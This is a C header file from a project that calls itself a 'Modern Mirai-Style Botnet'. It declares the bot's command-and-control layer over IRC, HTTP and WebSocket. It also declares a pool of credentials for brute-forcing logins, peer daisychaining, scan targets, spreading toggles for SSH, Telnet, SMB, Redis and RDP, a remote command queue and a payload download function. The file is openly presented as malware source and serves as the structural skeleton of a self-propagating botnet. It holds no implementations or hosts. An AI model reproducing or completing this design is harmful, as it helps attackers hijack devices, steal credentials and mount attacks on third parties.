/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.h - C2 protocol abstraction (IRC, HTTP, WebSocket)
 */
#ifndef NOTNET_PROTOCOL_H
#define NOTNET_PROTOCOL_H

#include "config.h"
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* ── Connection Types ───────────────────────────────────────── */
#define C2_IRC   0x01
#define C2_HTTP  0x02
#define C2_WS    0x04

/* ── IRC State ──────────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char channel[128];
    char pass[64];
    char nick[32];
    int sock;
    int connected;
    int authenticated;
    int joined;
    time_t last_ping;
} notnet_irc_t;

/* ── HTTP State ─────────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char path[128];
    char user_agent[128];
    int sock;
    int connected;
    time_t last_beat;
} notnet_http_t;

/* ── WebSocket State ────────────────────────────────────────── */
typedef struct {
    char server[256];
    uint16_t port;
    char path[128];
    int sock;
    int connected;
    time_t last_beat;
} notnet_ws_t;

/* ── Credentials Pool ───────────────────────────────────────── */
typedef struct {
    char username[64];
    char password[64];
} notnet_cred_t;

/* ── Bot State ──────────────────────────────────────────────── */
typedef struct {
    char hostname[BOT_MAX_HOSTNAME_LEN];
    time_t uptime;
    char os[BOT_MAX_OS_LEN];
    
    uint8_t c2_enabled;
    
    notnet_irc_t c2_irc;
    notnet_http_t c2_http;
    notnet_ws_t c2_ws;
    
    /* Peer daisychain */
    char peer_cache[PEER_CACHE_SIZE][256];
    int peer_count;
    
    /* Credentials */
    notnet_cred_t cred_pool[CRED_POOL_MAX];
    int cred_count;
    
    /* Scan config */
    uint32_t scan_interval;
    uint32_t scan_count;
    
    /* Commands queue */
    char cmd_queue[256][256];
    int cmd_count;
    
    /* Config overrides */
    uint8_t ssh_enabled;
    uint8_t telnet_enabled;
    uint8_t smb_enabled;
    uint8_t redis_enabled;
    uint8_t rdp_enabled;

    /* Scan targets (explicit IPs/subnets, override default subnets) */
    int scan_target_count;
    char scan_targets[16][256];

    /* Runtime scan limits (for testing) */
    uint32_t scan_timeout_ms;
    uint32_t scan_max_hosts;

    /* Heartbeat interval in seconds (0 = use default) */
    uint32_t heartbeat_interval;

    /* Update tracking */
    time_t last_update;
} notnet_bot_t;

/* ── IRC Functions ──────────────────────────────────────────── */
int irc_connect(notnet_bot_t *bot);
int irc_send(notnet_bot_t *bot, const char *format, ...);
int irc_read(notnet_bot_t *bot, char *buf, int len);
void irc_disconnect(notnet_bot_t *bot);

/* ── HTTP Functions ─────────────────────────────────────────── */
int http_connect(notnet_bot_t *bot);
int http_post(notnet_bot_t *bot, const char *data, int len);
int http_get(notnet_bot_t *bot, char *buf, int len);
int http_read(notnet_bot_t *bot, char *buf, int len);
int http_download(notnet_bot_t *bot, const char *url, const char *dest);
void http_disconnect(notnet_bot_t *bot);

/* ── WebSocket Functions ────────────────────────────────────── */
int ws_connect(notnet_bot_t *bot);
int ws_send(notnet_bot_t *bot, const char *data, int len);
int ws_read(notnet_bot_t *bot, char *buf, int len);
void ws_disconnect(notnet_bot_t *bot);

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot);
int protocol_process_commands(notnet_bot_t *bot);
int protocol_send_heartbeat(notnet_bot_t *bot);
int protocol_resolve_peers(notnet_bot_t *bot);
int protocol_resolve_host(const char *host);
char *protocol_hex_encode(const char *data, int len);

/* ── Config ─────────────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path);

#endif /* NOTNET_PROTOCOL_H */
